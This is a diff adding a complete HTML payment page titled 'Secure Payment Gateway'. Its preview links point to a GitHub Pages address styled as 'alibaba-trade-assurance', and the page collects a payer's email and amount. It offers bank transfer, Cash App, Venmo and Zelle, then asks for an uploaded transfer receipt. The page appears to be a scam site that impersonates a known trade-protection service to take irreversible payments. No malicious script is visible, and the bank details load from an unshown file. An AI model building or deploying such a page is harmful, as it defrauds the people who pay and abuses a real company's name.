@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Secure Payment Gateway</title>
+
+  <!-- Link preview (WhatsApp / Facebook / iMessage) -->
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Secure Payment Gateway">
+  <meta property="og:description" content="Complete your payment securely.">
+  <meta property="og:url" content="https://alibaba-trade-assurance.github.io/com/">
+  <meta property="og:image" content="https://alibaba-trade-assurance.github.io/com/images/logo.jpg">
+
+  <!-- Twitter/X -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Secure Payment Gateway">
+  <meta name="twitter:description" content="Complete your payment securely.">
+  <meta name="twitter:image" content="https://alibaba-trade-assurance.github.io/com/images/logo.jpg">
+
+  <link rel="icon" href="images/logo.jpg">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- HEADER SECTION -->
+  <header class="site-header">
+    <div class="header-container">
+      <div class="logo-area">
+        <div class="business-logo">
+          <img src="images/logo.jpg" alt="Site logo" class="site-logo">
+        </div>
+      </div>
+      <p class="secure-badge">Secure Payment Gateway</p>
+    </div>
+  </header>
+
+  <!-- MAIN CONTENT: EMAIL & AMOUNT FORM -->
+  <main class="main-container">
+    <div class="payment-card">
+      <h2 class="form-title">Complete your payment</h2>
+      
+      <div class="input-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" placeholder="you@example.com" autocomplete="email">
+        <div class="field-hint">Your payment confirmation will be sent to this email</div>
+      </div>
+
+      <div class="input-group">
+        <label for="amount">Amount</label>
+        <div class="currency-selector">
+          <button type="button" class="currency-btn" id="currencyBtn">Select currency ▾</button>
+          <ul class="currency-list" id="currencyList" aria-hidden="true">
+            
+            <li data-currency="USD">Dollar ($)</li>
+            <li data-currency="EUR">Euro (€)</li>
+            <li data-currency="GBP">Pounds (£)</li>
+            <li data-currency="JPY">Yen (¥)</li>
+            <li data-currency="NGN">Naira (₦)</li>
+          </ul>
+        </div>
+        <input type="number" id="amount" placeholder="0.00" step="any" autocomplete="off">
+        <div class="field-hint">Enter the exact amount you wish to pay</div>
+      </div>
+
+      <div class="payment-methods" aria-label="Payment method">
+        <div class="methods-label">Payment method</div>
+        <div class="methods-grid" role="list">
+          <button type="button" class="method-card active" data-method="bank" role="listitem">
+            <span class="method-logo" aria-hidden="true">🏦</span>
+            <span class="method-name">Bank Transfer</span>
+          </button>
+          <button type="button" class="method-card" data-method="cashapp" role="listitem">
+            <span class="method-logo" aria-hidden="true">
+              <svg viewBox="0 0 24 24" class="brand-svg" focusable="false" aria-hidden="true">
+                <rect x="2" y="2" width="20" height="20" rx="5" fill="#00D632"></rect>
+                <text x="12" y="15" text-anchor="middle" font-size="11" font-weight="700" fill="#0b2b3b">$</text>
+              </svg>
+            </span>
+            <span class="method-name">Cash App</span>
+          </button>
+          <button type="button" class="method-card" data-method="venmo" role="listitem">
+            <span class="method-logo" aria-hidden="true">
+              <svg viewBox="0 0 24 24" class="brand-svg" focusable="false" aria-hidden="true">
+                <rect x="2" y="2" width="20" height="20" rx="5" fill="#3D95CE"></rect>
+                <text x="12" y="15" text-anchor="middle" font-size="10" font-weight="700" fill="#ffffff">V</text>
+              </svg>
+            </span>
+            <span class="method-name">Venmo</span>
+          </button>
+          <button type="button" class="method-card" data-method="zelle" role="listitem">
+            <span class="method-logo" aria-hidden="true">
+              <svg viewBox="0 0 24 24" class="brand-svg" focusable="false" aria-hidden="true">
+                <rect x="2" y="2" width="20" height="20" rx="5" fill="#6D1ED4"></rect>
+                <text x="12" y="15" text-anchor="middle" font-size="9" font-weight="800" fill="#ffffff">Z</text>
+              </svg>
+            </span>
+            <span class="method-name">Zelle</span>
+          </button>
+        </div>
+      </div>
+
+      <button class="continue-btn" id="continueBtn">Continue to Payment →</button>
+    </div>
+  </main>
+
+  <script src="script.js"></script>
+  <script>
+    (function(){
+      const currencyBtn = document.getElementById('currencyBtn');
+      const currencyList = document.getElementById('currencyList');
+      const amountInput = document.getElementById('amount');
+      const selector = document.querySelector('.currency-selector');
+      const symbolMap = { NGN: '₦', USD: '$', EUR: '€', GBP: '£', JPY: '¥' };
+
+      function closeList() {
+        currencyList.classList.remove('open');
+        currencyList.setAttribute('aria-hidden','true');
+      }
+
+      currencyBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const open = currencyList.classList.toggle('open');
+        currencyList.setAttribute('aria-hidden', !open);
+      });
+
+      currencyList.addEventListener('click', (e) => {
+        const li = e.target.closest('li');
+        if (!li) return;
+        const code = li.dataset.currency;
+        const text = li.textContent.trim();
+        currencyBtn.textContent = text + ' ▾';
+        currencyBtn.dataset.currency = code;
+        amountInput.placeholder = symbolMap[code] + ' 0.00';
+        closeList();
+      });
+
+      document.addEventListener('click', (e) => {
+        if (!selector.contains(e.target)) closeList();
+      });
+    })();
+  </script>
+  <!-- Bank Transfer Modal -->
+  <div class="modal" id="bankTransferModal" aria-hidden="true">
+    <div class="modal-backdrop" data-close="true"></div>
+    <div class="modal-content" role="dialog" aria-modal="true">
+      <button class="modal-close" data-close="true">✕</button>
+      <div class="transfer-card" id="transferCard">
+        <div class="loading">Loading bank details...</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Alternative Payment Modal -->
+  <div class="modal" id="altPaymentModal" aria-hidden="true">
+    <div class="modal-backdrop" data-close="true"></div>
+    <div class="modal-content" role="dialog" aria-modal="true">
+      <button class="modal-close" data-close="true">✕</button>
+      <div class="transfer-card" id="altPaymentCard">
+        <div class="loading">Loading payment option...</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Upload Receipt Modal -->
+  <div class="modal" id="uploadReceiptModal" aria-hidden="true">
+    <div class="modal-backdrop" data-close="true"></div>
+    <div class="modal-content" role="dialog" aria-modal="true">
+      <button class="modal-close" data-close="true">✕</button>
+      <div class="upload-card" id="uploadCard">
+        <h2>📎 Upload Transfer Receipt</h2>
+        <div class="subtext">Upload a screenshot or photo of your transfer confirmation</div>
+
+        <div class="dropzone" id="modalDropzone">
+          📂 Click or drag to upload<br>
+          <small style="color:#708797;">PNG, JPG up to 5MB</small>
+          <div id="modalPreviewContainer"></div>
+        </div>
+
+        <input type="file" id="modalFileInput" accept="image/png, image/jpeg, image/jpg">
+        <button class="submit-btn" id="modalSubmitReceiptBtn">Submit Receipt</button>
+        <div id="modalUploadStatus" class="status"></div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
